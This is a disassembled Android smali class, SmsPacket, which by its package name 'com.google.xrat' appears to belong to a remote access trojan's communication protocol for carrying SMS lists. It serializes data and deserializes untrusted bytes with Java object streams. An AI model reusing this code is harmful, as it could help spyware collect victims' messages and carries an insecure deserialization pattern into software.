.class public Lcom/google/xrat/protocol/SmsPacket;
.super Ljava/lang/Object;

# interfaces
.implements Lcom/google/xrat/protocol/Packet;


# instance fields
.field list:Ljava/util/ArrayList;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method public constructor <init>(Ljava/util/ArrayList;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lcom/google/xrat/protocol/SmsPacket;->list:Ljava/util/ArrayList;

    return-void
.end method


# virtual methods
.method public build()[B
    .locals 3

    :try_start_0
    new-instance v0, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v0}, Ljava/io/ByteArrayOutputStream;-><init>()V

    new-instance v1, Ljava/io/ObjectOutputStream;

    invoke-direct {v1, v0}, Ljava/io/ObjectOutputStream;-><init>(Ljava/io/OutputStream;)V

    iget-object v2, p0, Lcom/google/xrat/protocol/SmsPacket;->list:Ljava/util/ArrayList;

    invoke-virtual {v1, v2}, Ljava/io/ObjectOutputStream;->writeObject(Ljava/lang/Object;)V

    invoke-virtual {v0}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/io/IOException;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/google/xrat/a/a;->a(Ljava/lang/Object;)V

    const/4 v0, 0x0

    goto :goto_0
.end method

.method public getList()Ljava/util/ArrayList;
    .locals 1

    iget-object v0, p0, Lcom/google/xrat/protocol/SmsPacket;->list:Ljava/util/ArrayList;

    return-object v0
.end method

.method public parse([B)V
    .locals 2

    new-instance v0, Ljava/io/ByteArrayInputStream;

    invoke-direct {v0, p1}, Ljava/io/ByteArrayInputStream;-><init>([B)V

    :try_start_0
    new-instance v1, Ljava/io/ObjectInputStream;

    invoke-direct {v1, v0}, Ljava/io/ObjectInputStream;-><init>(Ljava/io/InputStream;)V

    invoke-virtual {v1}, Ljava/io/ObjectInputStream;->readObject()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/util/ArrayList;

    iput-object v0, p0, Lcom/google/xrat/protocol/SmsPacket;->list:Ljava/util/ArrayList;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-void

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/google/xrat/a/a;->a(Ljava/lang/Object;)V

    goto :goto_0
.end method

.method public setList(Ljava/util/ArrayList;)V
    .locals 0

    iput-object p1, p0, Lcom/google/xrat/protocol/SmsPacket;->list:Ljava/util/ArrayList;

    return-void
.end method
